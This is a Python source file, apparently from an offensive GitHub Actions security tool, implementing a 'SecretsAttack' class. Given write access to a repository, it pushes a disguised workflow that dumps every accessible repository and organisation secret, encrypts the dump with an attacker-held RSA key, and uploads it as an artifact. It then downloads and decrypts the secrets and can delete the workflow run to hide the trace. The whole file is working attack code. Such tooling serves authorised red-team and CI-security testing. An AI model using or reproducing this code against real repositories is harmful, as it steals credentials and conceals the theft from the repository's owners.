"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import asyncio
import hashlib
import json
import random
import string

import yaml
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from gatox.attack.attack import Attacker
from gatox.cli.output import Output


class SecretsAttack(Attacker):
    """This class contains methods to create malicious yaml files for accessing and
    exfiltrating GitHub Actions secrets files.
    """

    async def __collect_secret_names(self, target_repo):
        """Method to collect list of secrets prior to exfil.

        Args:
            target_repo (str): Repository to get secrets from.

        Returns:
            list: List of secret names accessible to the repository.
        """

        secrets = []
        secret_names = []
        repo_secret_list = await self.api.get_secrets(target_repo)
        org_secret_list = await self.api.get_repo_org_secrets(target_repo)

        if repo_secret_list:
            secrets.extend(repo_secret_list)

        if org_secret_list:
            secrets.extend(org_secret_list)

        if not secrets:
            Output.warn("The repository does not have any accessible secrets!")
            return False
        else:
            Output.owned(
                f"The repository has {Output.bright(str(len(secrets)))} "
                "accessible secret(s)!"
            )

        secret_names = [secret["name"] for secret in secrets]

        return secret_names

    @staticmethod
    def create_exfil_yaml(
        pubkey: str,
        branch_name: str,
        environments: list[str] | None = None,
        runner: list[str] | None = None,
    ):
        """Create a malicious yaml file that will trigger on push and attempt
        to exfiltrate the provided list of secrets.

        Args:
            pubkey (str): Public key to encrypt the plaintext values with.
            branch_name (str): Name of the branch for on: push trigger.
            environments (list[str] | None): Optional list of environments to
                target via a job matrix.
        """
        yaml_file = {}

        yaml_file["name"] = branch_name
        yaml_file["on"] = {"push": {"branches": branch_name}}

        artifact_name = "files-${{ matrix.environment }}" if environments else "files"

        test_job = {
            "runs-on": runner or ["ubuntu-latest"],
            "steps": [
                {
                    "env": {"VALUES": "${{ toJSON(secrets)}}"},
                    "name": "Prepare repository",
                    "run": """
cat <<EOF > output.json
$VALUES
EOF
                    """,
                },
                {
                    "name": "Run Tests",
                    "env": {"PUBKEY": pubkey},
                    "run": "aes_key=$(openssl rand -hex 12 | tr -d '\\n');"
                    "openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key;"
                    'echo $aes_key | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2> /dev/null;',
                },
                # Upload the encrypted files as workflow run artifacts.
                # This avoids the edge case where there is a secret set to a value that is in the Base64 (which breaks everything).
                {
                    "name": "Upload artifacts",
                    "uses": "actions/upload-artifact@v4",
                    "with": {
                        "name": artifact_name,
                        "path": " |\noutput_updated.json\nlookup.txt",
                    },
                },
            ],
        }

        if environments:
            test_job["strategy"] = {"matrix": {"environment": environments}}
            test_job["environment"] = "${{ matrix.environment }}"

        yaml_file["jobs"] = {"testing": test_job}

        return yaml.dump(yaml_file, sort_keys=False)

    @staticmethod
    def __create_private_key():
        """Creates a private and public key to safely exfil secrets."""
        private_key = rsa.generate_private_key(
            public_exponent=65537, key_size=4096, backend=default_backend()
        )
        public_key = private_key.public_key()
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )

        return (private_key, pem.decode())

    @staticmethod
    def __decrypt_secrets(priv_key, encrypted_key, encrypted_secrets):
        """Utility method to decrypt secrets given ciphertext blob and a private key."""
        salt = encrypted_secrets[8:16]
        ciphertext = encrypted_secrets[16:]

        sym_key = priv_key.decrypt(encrypted_key, padding.PKCS1v15()).decode()
        sym_key = sym_key.replace("\n", "")
        derived_key = hashlib.pbkdf2_hmac("sha256", sym_key.encode(), salt, 10000, 48)
        key = derived_key[0:32]
        iv = derived_key[32:48]

        cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
        decryptor = cipher.decryptor()

        cleartext = decryptor.update(ciphertext) + decryptor.finalize()
        cleartext = cleartext[: -cleartext[-1]]

        return cleartext

    async def secrets_dump(
        self,
        target_repo: str,
        target_branch: str | None,
        commit_message: str | None,
        delete_action: bool,
        yaml_name: str,
        finegrain_scopes: set | None = None,
        environments: list[str] | None = None,
        runner: list[str] | None = None,
    ):
        """Given a user with write access to a repository, runs a workflow that
        dumps all repository secrets.

        Args:
            target_repo (str): Repository to target.
            target_branch (str | None): Branch to create workflow in.
            commit_message (str | None): Commit message for exfil workflow.
            delete_action (bool): Whether to delete the workflow after execution.
            yaml_name (str): Name of yaml to use for exfil workflow.
            finegrain_scopes (set | None): Fine-grained PAT scopes if applicable.
            environments (list[str] | None): Environments to target via job matrix.
            runner (list[str] | None): Runner labels. Defaults to ubuntu-latest.
        """
        if finegrain_scopes is None:
            finegrain_scopes = set()
        await self.setup_user_info()

        if not self.user_perms:
            return False
        if (
            "repo" in self.user_perms["scopes"]
            and "workflow" in self.user_perms["scopes"]
        ) or (
            "workflows:write" in finegrain_scopes
            and "contents:write" in finegrain_scopes
        ):
            # Only list secrets if we are not doing fine-grained PAT attack
            if not finegrain_scopes or "secrets:read" in finegrain_scopes:
                secret_names = await self.__collect_secret_names(target_repo)
                if not secret_names:
                    Output.warn("No accessible secrets to exfiltrate, not attempting!")
                    return False
            else:
                Output.info("Skipping secret enumeration for fine-grained PAT attack.")

            # Randomly generate a branch name, since this will run immediately
            if target_branch:
                branch = target_branch
            else:
                branch = "".join(random.choices(string.ascii_lowercase, k=10))

            res = await self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                Output.error("Failed to check for remote branch!")
                return
            elif res == 1:
                Output.error(f"Remote branch, {branch}, already exists!")
                return
            priv_key, pubkey_pem = self.__create_private_key()
            yaml_contents = self.create_exfil_yaml(
                pubkey_pem, branch, environments, runner
            )
            workflow_id = await self.execute_and_wait_workflow(
                target_repo, branch, yaml_contents, commit_message, yaml_name
            )
            if not workflow_id:
                return

            # Retry artifact retrieval - artifacts may not be immediately
            # available after workflow completion
            if environments:
                expected = {f"files-{env}" for env in environments}
                all_artifacts = {}
                for _ in range(30):
                    all_artifacts = await self.api.retrieve_all_workflow_artifacts(
                        target_repo, workflow_id
                    )
                    if expected.issubset(all_artifacts.keys()):
                        break
                    await asyncio.sleep(1)

                missing = expected - all_artifacts.keys()
                if missing:
                    Output.error(
                        f"Artifacts missing for environment(s): {', '.join(missing)}"
                    )

                self.__present_secrets_from_artifacts(
                    priv_key, all_artifacts, expected - missing
                )
            else:
                artifact = None
                for _ in range(30):
                    artifact = await self.api.retrieve_workflow_artifact(
                        target_repo, workflow_id
                    )
                    if (
                        artifact
                        and "output_updated.json" in artifact
                        and "lookup.txt" in artifact
                    ):
                        break
                    await asyncio.sleep(1)

                if not artifact or not (
                    "output_updated.json" in artifact and "lookup.txt" in artifact
                ):
                    Output.error(
                        "Failed to retrieve workflow artifact! "
                        "Artifacts may not have been uploaded."
                    )
                else:
                    self.__present_secrets_from_artifacts(
                        priv_key, {"files": artifact}, {"files"}
                    )

            if delete_action and (
                not finegrain_scopes or "actions:write" in finegrain_scopes
            ):
                res = await self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    Output.error("Failed to delete workflow!")
                else:
                    Output.result("Workflow deleted sucesfully!")
        else:
            Output.error(
                "The user does not have the necessary scopes to conduct this attack!"
            )

    def __present_secrets_from_artifacts(
        self,
        priv_key,
        artifacts: dict,
        names: set,
    ):
        """Decrypt artifacts and print de-duplicated secrets.

        Args:
            priv_key: RSA private key for decryption.
            artifacts (dict): {artifact_name: {filename: bytes}}
            names (set): Artifact names to process.
        """
        # Collect unique (key, value) pairs across all artifacts
        seen: set[tuple] = set()
        any_extracted = False

        Output.owned("Decrypted and Decoded Secrets:")
        for name in names:
            files = artifacts.get(name, {})
            if "output_updated.json" not in files or "lookup.txt" not in files:
                continue
            cleartext = self.__decrypt_secrets(
                priv_key, files["lookup.txt"], files["output_updated.json"]
            )
            secrets = json.loads(cleartext)
            for k, v in secrets.items():
                if k == "github_token":
                    continue
                pair = (k, v)
                if pair not in seen:
                    seen.add(pair)
                    print(f"{k}={v}")
                    any_extracted = True

        if not any_extracted:
            Output.warn(
                "No secrets were extracted. Org secrets are not "
                "accessible to public repos on the free plan."
            )
